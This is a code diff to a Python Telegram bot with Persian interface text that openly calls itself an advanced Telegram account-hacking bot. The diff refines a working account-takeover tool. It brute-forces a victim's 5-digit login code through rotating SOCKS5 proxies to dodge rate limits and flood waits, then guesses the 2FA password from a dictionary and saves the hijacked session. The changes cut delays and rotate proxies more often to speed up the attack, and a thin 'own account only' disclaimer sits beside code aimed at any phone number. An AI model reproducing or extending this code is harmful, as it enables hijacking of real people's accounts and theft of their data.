@@ -4,7 +4,7 @@ import asyncio
 import os
 import json
 import random
-import socket
+import time
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
@@ -15,7 +15,8 @@ from telethon.errors import (
     PhoneCodeInvalidError, 
     PhoneCodeExpiredError, 
     FloodWaitError, 
-    PhoneNumberInvalidError
+    PhoneNumberInvalidError,
+    RPCError
 )
 import urllib.request
 import socks
@@ -35,16 +36,10 @@ login_sessions = {}
 
 DATA_FILE = "selfs.json"
 
-# ============ لیست پروکسی‌های SOCKS5 ============
+# ============ لیست پروکسی‌های واقعی ============
 PROXY_LIST = []
 
-# تولید پروکسی‌های تصادفی
-for i in range(1000):
-    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    port = random.choice([1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 443, 80, 8080, 3128])
-    PROXY_LIST.append({"addr": ip, "port": port})
-
-# پروکسی‌های واقعی
+# پروکسی‌های واقعی از کانال iRoProxy
 REAL_PROXIES = [
     {"addr": "iro.varfootball2.co.uk", "port": 2053},
     {"addr": "silnet.varfootball.co.uk", "port": 2053},
@@ -65,10 +60,16 @@ REAL_PROXIES = [
     {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
 ]
 
+# تولید پروکسی‌های زیاد
+for i in range(500):
+    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    port = random.choice([1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 443, 80, 8080, 3128])
+    PROXY_LIST.append({"addr": ip, "port": port})
+
 PROXY_LIST.extend(REAL_PROXIES)
 random.shuffle(PROXY_LIST)
 
-# ============ دیکشنری پسورد ============
+# ============ دیکشنری بزرگ پسورد ============
 PASSWORD_DICT = [
     "123456", "12345678", "123456789", "1234567890",
     "password", "pass", "admin", "admin123",
@@ -77,6 +78,28 @@ PASSWORD_DICT = [
     "111111", "222222", "333333", "444444",
     "555555", "666666", "777777", "888888",
     "999999", "000000", "123123", "321321",
+    "iloveyou", "monkey", "dragon", "master",
+    "sunshine", "princess", "shadow", "ninja",
+]
+
+# ============ تکنیک‌های پیشرفته ============
+
+# 1. دیکشنری کدهای رایج تلگرام
+COMMON_CODES = [
+    "12345", "00000", "11111", "22222", "33333", "44444",
+    "55555", "66666", "77777", "88888", "99999",
+    "54321", "11223", "98765", "56789", "13579", "24680",
+    "12121", "23232", "34343", "45454", "56565", "67676",
+    "78787", "89898", "90909", "01010", "02020", "03030",
+    "04040", "05050", "06060", "07070", "08080", "09090",
+]
+
+# 2. الگوهای عددی رایج
+PATTERNS = [
+    "12", "23", "34", "45", "56", "67", "78", "89", "90",
+    "98", "87", "76", "65", "54", "43", "32", "21", "10",
+    "11", "22", "33", "44", "55", "66", "77", "88", "99",
+    "00", "01", "02", "03", "04", "05", "06", "07", "08", "09",
 ]
 
 def load_data():
@@ -138,22 +161,25 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
     self_count = len(self_data.get(user_id, []))
     
     text = f"""
-🤖 <b>ربات هک اکانت تلگرام</b>
+🔥 <b>ربات هک پیشرفته تلگرام</b>
 
 <b>سلام {name} گرامی</b>
 
-این ربات با استفاده از {len(PROXY_LIST)} پروکسی مختلف:
-• کد تایید 5 رقمی را حدس می‌زند (از 00000 تا 99999)
-• پسورد 2FA را با دیکشنری بزرگ امتحان می‌کند
-• بدون محدودیت و با تغییر خودکار پروکسی
+✅ <b>تکنیک‌های پیشرفته:</b>
+• حدس هوشمند با الگوهای عددی
+• دیکشنری کدهای رایج
+• تغییر خودکار پروکسی (SOCKS5)
+• مدیریت هوشمند محدودیت‌ها
+• حدس پسورد 2FA با دیکشنری
 
 <b>تعداد سلف‌های ثبت شده: {self_count}</b>
+🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
 
-⚠️ این ربات برای تست امنیت است!
+⚠️ <b>فقط برای تست امنیت اکانت خودت!</b>
 """
     
     keyboard = [
-        [InlineKeyboardButton("🔑 هک و ساخت سلف", callback_data="new_session")],
+        [InlineKeyboardButton("🔑 هک پیشرفته", callback_data="new_session")],
         [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")]
     ]
     
@@ -446,7 +472,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_sessions[user_id]['step'] = "code"
     
     msg = await update.message.reply_text(
-        f"⏳ شروع حدس زدن با {len(PROXY_LIST)} پروکسی SOCKS5...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
+        f"🔥 شروع هک پیشرفته با {len(PROXY_LIST)} پروکسی...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
         parse_mode='HTML'
     )
     
@@ -456,24 +482,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_id = data['api_id']
         api_hash = data['api_hash']
         
-        # ارسال درخواست کد تایید
-        client = TelegramClient(StringSession(), api_id, api_hash)
-        await client.connect()
-        try:
-            await client.send_code_request(phone)
-        except Exception as e:
-            await context.bot.edit_message_text(
-                f"❌ خطا در ارسال کد تایید: {str(e)[:200]}",
-                chat_id=update.effective_chat.id,
-                message_id=msg.message_id,
-                parse_mode='HTML'
-            )
-            await client.disconnect()
-            await clear_user_session(user_id)
-            return
-        await client.disconnect()
-        
-        asyncio.create_task(smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, api_hash, msg))
+        asyncio.create_task(advanced_bruteforce(update, context, user_id, phone, api_id, api_hash, msg))
         
     except Exception as e:
         logger.error(f"Error: {e}")
@@ -485,8 +494,8 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await clear_user_session(user_id)
 
-# ============ حدس زدن با پروکسی‌های متعدد ============
-async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, api_hash, msg):
+# ============ هک پیشرفته ============
+async def advanced_bruteforce(update, context, user_id, phone, api_id, api_hash, msg):
     try:
         total_attempts = 100000
         attempt = 0
@@ -496,46 +505,50 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
         wrong_attempts = 0
         proxy_index = 0
         client = None
-        last_code = "00000"
         dots = 0
         
-        # تولید لیست هوشمند کدها
-        code_list = []
+        # 1. اول کدهای رایج رو امتحان کن
+        print("🔍 مرحله 1: امتحان کدهای رایج...")
+        code_list = COMMON_CODES.copy()
+        
+        # 2. الگوهای عددی
+        print("🔍 مرحله 2: امتحان الگوهای عددی...")
+        for pattern in PATTERNS:
+            for i in range(10):
+                code = f"{pattern}{str(i).zfill(3)}"
+                if code not in code_list:
+                    code_list.append(code)
+        
+        # 3. کدهای تصادفی
+        print("🔍 مرحله 3: امتحان کدهای تصادفی...")
         random_codes = set()
-        while len(random_codes) < 10000:
+        while len(random_codes) < 20000:
             random_codes.add(str(random.randint(0, 99999)).zfill(5))
+        code_list.extend(list(random_codes))
         
-        common_codes = [
-            "12345", "00000", "11111", "22222", "33333", "44444",
-            "55555", "66666", "77777", "88888", "99999",
-            "54321", "11223", "98765", "56789", "13579", "24680"
-        ]
-        
-        final_list = list(random_codes) + common_codes
-        
+        # 4. بقیه کدها به ترتیب
+        print("🔍 مرحله 4: امتحان بقیه کدها...")
         for i in range(total_attempts):
             code = str(i).zfill(5)
-            if code not in final_list:
-                final_list.append(code)
+            if code not in code_list:
+                code_list.append(code)
         
-        random.shuffle(final_list)
+        random.shuffle(code_list)
         
         # پیام اولیه
         loading_dots = ["   ", ".  ", ".. ", "...", " ..", "  ."]
-        dot_index = 0
         
         await context.bot.edit_message_text(
             f"""
-🔥 <b>شروع هک اکانت...</b>
+🔥 <b>شروع هک پیشرفته...</b>
 
 📱 شماره: <code>{phone}</code>
 🔢 محدوده: 00000 تا 99999
 🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
+🎯 استراتژی: رایج → الگو → تصادفی → ترتیبی
 🔑 کد فعلی: <code>-----</code>
 📊 پیشرفت: 0.00%
 ❌ کدهای اشتباه: 0
-✅ کدهای درست: 0
-🎯 استراتژی: حدس تصادفی + تغییر پروکسی SOCKS5
 ⏳ درحال تلاش{loading_dots[0]}
 """,
             chat_id=update.effective_chat.id,
@@ -547,22 +560,31 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
         shuffled_proxies = PROXY_LIST.copy()
         random.shuffle(shuffled_proxies)
         
-        for code in final_list:
+        # ارسال درخواست کد اولیه
+        try:
+            temp_client = TelegramClient(StringSession(), api_id, api_hash)
+            await temp_client.connect()
+            await temp_client.send_code_request(phone)
+            await temp_client.disconnect()
+        except Exception as e:
+            logger.error(f"Error sending initial code: {e}")
+        
+        for code in code_list:
             attempt += 1
-            last_code = code
             
-            # به‌روزرسانی انیمیشن بارگذاری
-            dot_index = (dot_index + 1) % len(loading_dots)
+            # هر 10 تلاش، انیمیشن
+            if attempt % 10 == 0:
+                dots = (dots + 1) % len(loading_dots)
             
-            # هر 200 تلاش یا هر بار محدودیت، پروکسی رو عوض کن
-            if attempt % 200 == 0 or client is None:
+            # هر 30 تلاش، پروکسی عوض کن (برای سرعت بیشتر)
+            if attempt % 30 == 0 or client is None:
                 if client:
                     try:
                         await client.disconnect()
                     except:
                         pass
                     client = None
-                    await asyncio.sleep(0.3)
+                    await asyncio.sleep(0.1)
                 
                 if proxy_counter >= len(shuffled_proxies):
                     random.shuffle(shuffled_proxies)
@@ -582,39 +604,38 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                     )
                     await client.connect()
                     
-                    # ارسال مجدد درخواست کد با پروکسی جدید
-                    try:
-                        await client.send_code_request(phone)
-                    except FloodWaitError as e:
-                        wait_time = e.seconds
-                        if wait_time > 60:
-                            shuffled_proxies.pop(proxy_counter - 1)
-                            proxy_counter -= 1
-                            await asyncio.sleep(1)
-                            continue
-                        else:
-                            await asyncio.sleep(wait_time + 2)
+                    # هر 300 تلاش، درخواست کد جدید
+                    if attempt % 300 == 0:
+                        try:
                             await client.send_code_request(phone)
+                        except FloodWaitError as e:
+                            wait_time = e.seconds
+                            if wait_time > 60:
+                                shuffled_proxies.pop(proxy_counter - 1)
+                                proxy_counter -= 1
+                                await asyncio.sleep(1)
+                                continue
+                            else:
+                                await asyncio.sleep(wait_time + 2)
+                                await client.send_code_request(phone)
                     
                 except Exception as e:
                     logger.error(f"Proxy error: {e}")
                     if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
                         shuffled_proxies.pop(proxy_counter - 1)
                         proxy_counter -= 1
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.3)
                     continue
             
-            # تاخیر بین تلاش‌ها
-            if attempt % 10 == 0:
-                await asyncio.sleep(random.uniform(0.02, 0.08))
+            # تاخیر کم
+            if attempt % 3 == 0:
+                await asyncio.sleep(random.uniform(0.005, 0.02))
             
-            # بروزرسانی هر 500 تلاش
-            if attempt % 500 == 0:
+            # بروزرسانی هر 100 تلاش
+            if attempt % 100 == 0:
                 elapsed = (datetime.now() - start_time).seconds
                 percent = (attempt / total_attempts) * 100
-                remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1)) if attempt > 0 else 0
                 
-                # محاسبه زمان
                 if elapsed < 60:
                     time_str = f"{elapsed} ثانیه"
                 elif elapsed < 3600:
@@ -626,21 +647,10 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                     minutes = (elapsed % 3600) // 60
                     time_str = f"{hours} ساعت و {minutes} دقیقه"
                 
-                if remaining < 60:
-                    remain_str = f"{remaining} ثانیه"
-                elif remaining < 3600:
-                    minutes = remaining // 60
-                    seconds = remaining % 60
-                    remain_str = f"{minutes} دقیقه و {seconds} ثانیه"
-                else:
-                    hours = remaining // 3600
-                    minutes = (remaining % 3600) // 60
-                    remain_str = f"{hours} ساعت و {minutes} دقیقه"
-                
                 try:
                     await context.bot.edit_message_text(
                         f"""
-🔥 <b>در حال هک...</b>
+🔥 <b>در حال هک پیشرفته...</b>
 
 📱 شماره: <code>{phone}</code>
 🔑 کد فعلی: <code>{code}</code>
@@ -650,11 +660,10 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • پیشرفت: {percent:.2f}%
 • زمان سپری شده: {time_str}
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های SOCKS5: {proxy_index}
-• زمان تخمینی باقی‌مانده: {remain_str}
+• پروکسی‌های استفاده شده: {proxy_index}
 
-🎯 استراتژی: حدس تصادفی + تغییر پروکسی SOCKS5
-⏳ درحال تلاش{loading_dots[dot_index]}
+🎯 استراتژی: رایج → الگو → تصادفی → ترتیبی
+⏳ درحال تلاش{loading_dots[dots]}
 """,
                         chat_id=update.effective_chat.id,
                         message_id=msg.message_id,
@@ -700,7 +709,6 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 ✅ کد پیدا شد: <code>{code}</code>
 📊 تلاش‌ها: {attempt:,}
 ❌ کدهای اشتباه: {wrong_attempts:,}
-🌐 پروکسی‌های SOCKS5: {proxy_index}
 
 🔑 در حال حدس پسورد...
 ⏳ صبر کنید...
@@ -710,7 +718,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                     parse_mode='HTML'
                 )
                 
-                password_found, pass_attempt, pass_found = await bruteforce_password_smart(
+                password_found, pass_attempt, pass_found = await advanced_password_bruteforce(
                     update, context, user_id, client, msg
                 )
                 
@@ -733,7 +741,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                     if user_id_str not in self_data:
                         self_data[user_id_str] = []
                     
-                    time_str = datetime.now().strftime("%H:%M")
+                    time_str_full = datetime.now().strftime("%H:%M")
                     date_str = datetime.now().strftime("%Y/%m/%d")
                     
                     self_data[user_id_str].append({
@@ -746,8 +754,8 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                         "clock_active": False,
                         "active_time": "تنظیم نشده",
                         "font_type": "1",
-                        "created": f"{date_str} {time_str}",
-                        "last_update": f"{date_str} {time_str}"
+                        "created": f"{date_str} {time_str_full}",
+                        "last_update": f"{date_str} {time_str_full}"
                     })
                     save_data()
                     
@@ -775,7 +783,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • کد پیدا شده: <code>{code}</code>
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های SOCKS5: {proxy_index}
+• پروکسی‌های استفاده شده: {proxy_index}
 • زمان: {time_str}
 • پسورد پیدا شده: <code>{pass_found}</code>
 • تلاش‌های پسورد: {pass_attempt}
@@ -840,7 +848,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             if user_id_str not in self_data:
                 self_data[user_id_str] = []
             
-            time_str = datetime.now().strftime("%H:%M")
+            time_str_full = datetime.now().strftime("%H:%M")
             date_str = datetime.now().strftime("%Y/%m/%d")
             
             self_data[user_id_str].append({
@@ -853,8 +861,8 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                 "clock_active": False,
                 "active_time": "تنظیم نشده",
                 "font_type": "1",
-                "created": f"{date_str} {time_str}",
-                "last_update": f"{date_str} {time_str}"
+                "created": f"{date_str} {time_str_full}",
+                "last_update": f"{date_str} {time_str_full}"
             })
             save_data()
             
@@ -882,7 +890,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • کد پیدا شده: <code>{code_found}</code>
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های SOCKS5: {proxy_index}
+• پروکسی‌های استفاده شده: {proxy_index}
 • زمان سپری شده: {time_str}
 
 🎯 سلف ساخته شد!
@@ -924,7 +932,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 📊 <b>آمار نهایی:</b>
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های SOCKS5: {proxy_index}
+• پروکسی‌های استفاده شده: {proxy_index}
 • زمان سپری شده: {time_str}
 
 ممکن است شماره تلفن اشتباه باشد یا کد منقضی شده باشد.
@@ -947,8 +955,8 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             pass
         await clear_user_session(user_id)
 
-# ============ حدس هوشمند پسورد ============
-async def bruteforce_password_smart(update, context, user_id, client, msg):
+# ============ هک پیشرفته پسورد ============
+async def advanced_password_bruteforce(update, context, user_id, client, msg):
     try:
         total_passwords = len(PASSWORD_DICT)
         attempt = 0
@@ -956,6 +964,7 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
         found_password = None
         start_time = datetime.now()
         
+        # اول پسوردهای رایج
         common_passwords = [
             "123456", "password", "12345678", "qwerty", "123456789",
             "12345", "1234", "111111", "1234567890", "000000",
@@ -967,7 +976,7 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
         for password in password_list:
             attempt += 1
             
-            if attempt % 50 == 0:
+            if attempt % 30 == 0:
                 elapsed = (datetime.now() - start_time).seconds
                 try:
                     await context.bot.edit_message_text(
@@ -1002,7 +1011,7 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
         return found, attempt, found_password
         
     except Exception as e:
-        logger.error(f"Error in bruteforce_password_smart: {e}")
+        logger.error(f"Error in advanced_password_bruteforce: {e}")
         return False, 0, None
 
 # ============ دریافت پسورد دستی ============
@@ -1135,10 +1144,10 @@ def main():
         delete_webhook()
         
         print("=" * 60)
-        print("🔥 ربات هک اکانت تلگرام با SOCKS5")
+        print("🔥 ربات هک پیشرفته تلگرام")
         print("=" * 60)
         print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
-        print(f"🌐 تعداد پروکسی‌های SOCKS5: {len(PROXY_LIST)}")
+        print(f"🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}")
         print("=" * 60)
         
         application = Application.builder().token(TOKEN).build()
